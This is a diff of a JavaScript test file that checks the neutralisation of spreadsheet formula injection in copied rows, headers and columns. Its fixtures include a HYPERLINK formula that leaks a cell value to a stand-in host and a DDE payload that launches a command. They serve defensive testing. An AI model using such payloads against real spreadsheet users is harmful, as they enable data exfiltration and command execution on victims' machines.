@@ -122,23 +122,32 @@ describe("spreadsheet formulas in copied rows (#208)", () => {
 		expect(spreadsheetSafe("")).toBe("");
 	});
 
-	it("leaves a number's sign alone, but not a formula on a number or Yes/No column", () => {
+	it("leaves a number's sign alone, but not a formula shown for a numeric value", () => {
 		expect(spreadsheetSafe("-5", -5)).toBe("-5");
 		expect(spreadsheetSafe("-$5.00", -5)).toBe("-$5.00");
+		expect(spreadsheetSafe("-1,234.50", -1234.5)).toBe("-1,234.50");
+		expect(spreadsheetSafe("-5,00 kr", -5)).toBe("-5,00 kr");
+		expect(spreadsheetSafe("-€ 5,00", -5)).toBe("-€ 5,00");
 		expect(spreadsheetSafe("+1", 1)).toBe("+1");
-		// A choice label is shown for a numeric raw value, and a label can start with =
+		// A choice label is shown for a numeric raw value, and a label can start with =, + or -
 		expect(spreadsheetSafe("=Other", 3)).toBe("'=Other");
+		expect(spreadsheetSafe('+HYPERLINK("http://x")', 3)).toBe(`'+HYPERLINK("http://x")`);
+		expect(spreadsheetSafe("-Other", 3)).toBe("'-Other");
+		expect(spreadsheetSafe("-2+3", 1)).toBe("'-2+3");
 		// A text column's "-5" is text: Excel would still read it as a formula input
 		expect(spreadsheetSafe("-5", "-5")).toBe("'-5");
 	});
 
-	it("neutralises copied rows and columns, as shown and raw", () => {
+	it("neutralises copied rows, as shown and raw", () => {
 		const shown = rowsToTsv(formulaRows, [name, revenue, description]).split("\n");
 		expect(shown[1]).toBe(`"'=HYPERLINK(""https://example.invalid/?d=""&A2,""Click"")"\t-$5.00\t'@SUM(A1:A2)`);
 		expect(shown[2]).toBe("'+cmd|' /C calc'!A0\t3\t'-2+3");
 		expect(shown[3]).toBe("\"'\tindented\"\t\tplain text");
 		expect(rowsToTsv(formulaRows, [revenue], "raw").split("\n")[1]).toBe("-5");
-		expect(columnToText(formulaRows, description)).toBe("'@SUM(A1:A2)\n'-2+3\nplain text");
+	});
+
+	it("copies a column exactly, for pasting into an in condition", () => {
+		expect(columnToText(formulaRows, description)).toBe("@SUM(A1:A2)\n-2+3\nplain text");
 	});
 
 	it("neutralises a header too", () => {
